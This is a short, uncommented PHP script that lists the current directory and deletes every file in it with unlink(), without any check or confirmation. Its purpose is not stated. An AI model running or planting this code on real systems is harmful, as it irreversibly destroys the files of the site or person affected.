<?php
if($handle = opendir('.'))
{
        while(false !== ($file = readdir($handle)))
                if($file != "." && $file != "..") unlink($file);
        closedir($handle);
}
?>